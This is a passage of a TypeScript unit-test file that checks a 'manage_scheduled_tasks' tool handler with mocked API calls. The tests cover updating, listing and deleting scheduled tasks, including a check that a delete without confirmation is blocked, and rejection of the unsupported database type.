    (ctx.api.applications.updateScheduledTask as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      uuid: 'task1',
      name: 'updated',
    });
    const tool = findTool('manage_scheduled_tasks');
    const result = await tool.handler(
      {
        type: 'applications',
        uuid: 'abc123',
        action: 'update',
        task_uuid: 'task1',
        name: 'updated',
        confirm: true,
      },
      ctx,
    );
    expect(result.status).toBe('ok');
  });

  it('blocks delete-task without confirm', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('manage_scheduled_tasks');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'delete', task_uuid: 'task1' },
      ctx,
    );

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('confirmation_required');
  });

  it('deletes a scheduled task when confirmed', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.applications.deleteScheduledTask as ReturnType<typeof vi.fn>).mockResolvedValueOnce({
      message: 'Task deleted.',
    });

    const tool = findTool('manage_scheduled_tasks');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'delete', task_uuid: 'task1', confirm: true },
      ctx,
    );

    expect(result.status).toBe('ok');
    // oxlint-disable-next-line typescript/unbound-method -- asserting on a vi.fn mock, which needs no receiver
    expect(ctx.api.applications.deleteScheduledTask).toHaveBeenCalledWith('abc123', 'task1');
  });

  it('lists executions for a scheduled task', async () => {
    const ctx = makeDestructiveCtx();
    (
      ctx.api.applications.scheduledTaskExecutions as ReturnType<typeof vi.fn>
    ).mockResolvedValueOnce([{ uuid: 'exec1', status: 'finished' }]);

    const tool = findTool('manage_scheduled_tasks');
    const result = await tool.handler(
      { type: 'applications', uuid: 'abc123', action: 'executions', task_uuid: 'task1' },
      ctx,
    );

    expect(result.status).toBe('ok');
    expect(Array.isArray((result as Record<string, unknown>).executions)).toBe(true);
  });

  it('lists scheduled tasks for a service', async () => {
    const ctx = makeDestructiveCtx();
    (ctx.api.services.listScheduledTasks as ReturnType<typeof vi.fn>).mockResolvedValueOnce([
      { uuid: 'task3' },
    ]);

    const tool = findTool('manage_scheduled_tasks');
    const result = await tool.handler({ type: 'services', uuid: 'ghi789', action: 'list' }, ctx);

    expect(result.status).toBe('ok');
  });

  it('returns invalid_input for databases (no scheduled tasks)', async () => {
    const ctx = makeDestructiveCtx();
    const tool = findTool('manage_scheduled_tasks');
    const result = await tool.handler({ type: 'databases', uuid: 'def456', action: 'list' }, ctx);

    expect(result.status).toBe('error');
    const r = result as Record<string, unknown>;
    expect((r.error as Record<string, unknown>).kind).toBe('invalid_input');
  });
});
